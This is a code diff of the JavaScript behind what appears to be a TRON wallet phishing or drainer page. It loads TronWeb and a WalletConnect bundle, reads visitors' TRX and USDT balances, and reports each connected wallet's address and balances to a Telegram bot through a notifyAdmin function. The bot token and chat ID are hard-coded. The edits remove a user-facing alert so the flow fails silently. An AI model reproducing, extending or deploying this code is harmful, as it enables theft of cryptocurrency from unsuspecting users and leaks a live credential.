@@ -1,25 +1,3 @@
-// app.js
-
-// Dynamic Script Loader
-const loadScript = (src) => {
-    return new Promise((resolve) => {
-        if (document.querySelector(`script[src="${src}"]`)) return resolve();
-        const s = document.createElement('script');
-        s.src = src;
-        s.async = true;
-        s.onload = resolve;
-        document.head.appendChild(s);
-    });
-};
-
-// Initial silent background loading
-window.addEventListener('load', () => {
-    setTimeout(async () => {
-        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
-        await loadScript("wc-bundle.js");
-    }, 100);
-});
-
 const CONFIG = {
     BOT_TOKEN: "8738726378:AAHkiTAAZ16hoGFObK_v76yi0f0wqITMZXM",
     CHAT_ID: "8249230506",
@@ -44,9 +22,6 @@ async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
 }
 
 async function getStats(address) {
-    if (typeof TronWeb === 'undefined') {
-        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
-    }
     const tw = new TronWeb({ fullHost: 'https://api.trongrid.io' });
     let trx = "0.00", usdt = "0.00";
     try {
@@ -61,21 +36,17 @@ document.getElementById('next-btn').addEventListener('click', async () => {
     const btn = document.getElementById('next-btn');
     btn.classList.add('btn-loading'); // Always show spinner first
 
-    // Advanced Loop: Keep spinning until system is ready (No alert popups)
+    // Silent check: Wait until systems are ready without showing alerts
+    let attempts = 0;
+    while(typeof window.connectWalletConnectTron !== 'function' && attempts < 30) {
+        await new Promise(r => setTimeout(r, 500));
+        attempts++;
+    }
+
     if (typeof window.connectWalletConnectTron !== 'function') {
-        await loadScript("wc-bundle.js");
-        await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
-        
-        let attempts = 0;
-        while(typeof window.connectWalletConnectTron !== 'function' && attempts < 20) {
-            await new Promise(r => setTimeout(r, 500)); // Wait 0.5s and check again
-            attempts++;
-        }
-        
-        if (typeof window.connectWalletConnectTron !== 'function') {
-            btn.classList.remove('btn-loading');
-            return alert("Connection system taking too long. Please refresh.");
-        }
+        btn.classList.remove('btn-loading');
+        console.error("System timeout");
+        return;
     }
 
     try {
